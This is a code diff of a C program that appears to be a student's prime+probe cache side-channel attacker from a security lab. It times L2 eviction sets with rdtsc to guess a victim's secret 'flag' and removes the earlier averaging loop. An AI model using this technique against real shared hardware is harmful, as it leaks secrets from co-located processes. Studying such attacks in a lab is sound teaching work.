@@ -2,54 +2,29 @@
 #include <stdint.h>
 #include "util.h"
 
-#define NUM_SETS NUM_L2_CACHE_SETS
-#define PROBE_REPS 100000
-
 int main() {
+    char *buf = get_buffer();  // lab-provided buffer
+    char *eviction_sets[NUM_L2_CACHE_SETS][16];
 
-    // Allocate large buffer like victim
-    char *buf = get_buffer();
-
-    // Create eviction sets for each cache set
-    char *eviction_sets[NUM_SETS][16];
-
-    for (int i = 0; i < NUM_SETS; i++) {
+    for (int i = 0; i < NUM_L2_CACHE_SETS; i++)
         get_partial_eviction_set(eviction_sets[i], i);
-    }
 
     while (1) {
-
-        uint64_t times[NUM_SETS];
-
-        for (int set = 0; set < NUM_SETS; set++) {
-
-            uint64_t total = 0;
-
-            for (int r = 0; r < PROBE_REPS; r++) {
-
-                uint64_t start = rdtsc();
-
-                for (int j = 0; j < 16; j++) {
-                    (*(eviction_sets[set][j]))++;
-                }
-
-                uint64_t end = rdtsc();
-
-                total += (end - start);
-            }
-
-            times[set] = total;
+        uint64_t times[NUM_L2_CACHE_SETS];
+        for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+            uint64_t start = rdtsc();
+            for (int j = 0; j < 16; j++)
+                (*(eviction_sets[set][j]))++;
+            uint64_t end = rdtsc();
+            times[set] = end - start;
         }
 
-        int max_set = 0;
+        int guessed_flag = 0;
+        for (int i = 1; i < NUM_L2_CACHE_SETS; i++)
+            if (times[i] > times[guessed_flag])
+                guessed_flag = i;
 
-        for (int i = 1; i < NUM_SETS; i++) {
-            if (times[i] > times[max_set]) {
-                max_set = i;
-            }
-        }
-
-        printf("Guessed flag: %d\n", max_set);
+        printf("Guessed flag: %d\n", guessed_flag);
     }
 
     return 0;
